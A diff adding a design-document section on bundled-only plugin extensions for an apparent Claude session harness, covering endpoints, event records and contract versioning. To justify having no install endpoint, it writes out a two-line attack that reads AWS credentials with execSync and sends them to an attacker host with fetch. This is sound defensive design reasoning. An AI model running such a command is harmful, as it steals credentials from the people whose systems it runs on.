@@ -478,3 +478,64 @@ precedence list and one slot failing must let the next be tried.
 deliberately is not overridden by a stale Keychain item, and the documented file/profile slots still
 sit above the Keychain.
 
+## 10. Extensions — bundled only
+
+A contributor registers a handler at one of the four extension points. Per session, an owner may turn
+one on or off; every participant can see which are in force, because a `tool:before` gate decides
+what Claude may do.
+
+### There is no install endpoint, and that is a decision
+
+Measurement of a `worker_thread` with `env: {}` settled it. The environment half holds — no credentials in
+`process.env`, and a spawned child does not inherit them either. Everything else does not: code
+inside one read `~/.claude.json` and the credential module's own source, ran `child_process.execSync`,
+and had `fetch` and `SharedArrayBuffer`. So `execSync("cat ~/.aws/credentials")` + `fetch(attacker)`
+defeats the arrangement in two lines.
+
+** is therefore satisfied by construction rather than by enforcement**: no code path loads
+foreign code. `npm run test:plugin-adversarial` asserts that absence across six mechanisms
+(`worker_threads`, `node:vm`, a computed dynamic `import`, `createRequire`, `eval`, `new Function`),
+with a non-vacuity check per pattern, and asserts that `host.ts` exports no `install`, `discover` or
+`uninstall`. **If third-party support is ever wanted, that gate fails first** — which is the intended
+design review.
+
+### Endpoints
+
+- **`GET /plugins?session_id=<id>`** → `{ plugins: [{ id, version, origin, contractVersion,
+  contributes, summary, enabled }] }`. `enabled` is `null` when no session is named — distinct from
+  `false`, which would claim it is off.
+- **`POST /sessions/:id/plugins`** `{ plugin_id, enabled }` → `200 { plugin_id, enabled, active }`,
+  or **`422`** `{ error: "plugin_refused", message }` for an unknown id or an incompatible contract
+  version. Returns the RESOLVED set so Rails can put it on the event without asking again.
+
+Rails gates first (`:view` to read, `:manage_session` to change) and the harness re-checks the id and
+the contract version regardless, because the harness owns the record and must not write an enablement
+it cannot honour.
+
+### The record/event split
+
+The harness writes the **record** (`session.plugins`); Rails appends the **event**
+(`plugin_enabled` / `plugin_disabled`). Not an arbitrary division: the harness allocates per-RUN
+`seq`, and a plugin toggle belongs to no run. `skill_changed` works the same way for the same reason.
+
+The DESCRIPTOR is copied into the register rather than referenced , so a session stays
+readable after a contributor leaves the build — and an entry this build no longer ships is inert
+rather than fatal, while the register still holds what it named.
+
+### Contract-version refusal
+
+Exact `major`, and `minor` at least what the contributor needs — the same rule consumers apply to
+`CONTRACT_VERSION`. An incompatible contributor is refused with a reason and never partially loaded:
+one that half-works leaves the room unable to tell which of its rules are in force.
+
+### When a toggle takes effect
+
+**At the next run start.** The set is resolved once, like the tool set and the skill set. A mid-run
+change would make "which rules applied to this tool call" ambiguous even with a fresh
+`request_header`, since the header is per-turn and a call is finer-grained. The urgent case — stop
+what is happening now — is INTERRUPT, which is immediate and unambiguous. The panel says this, because
+a toggle that appears not to work is worse than one that explains its timing.
+
+R7's prompt-cache constraint does not apply: contributors register handlers, not tools, so no tool
+declaration changes and no cache prefix shifts.
+
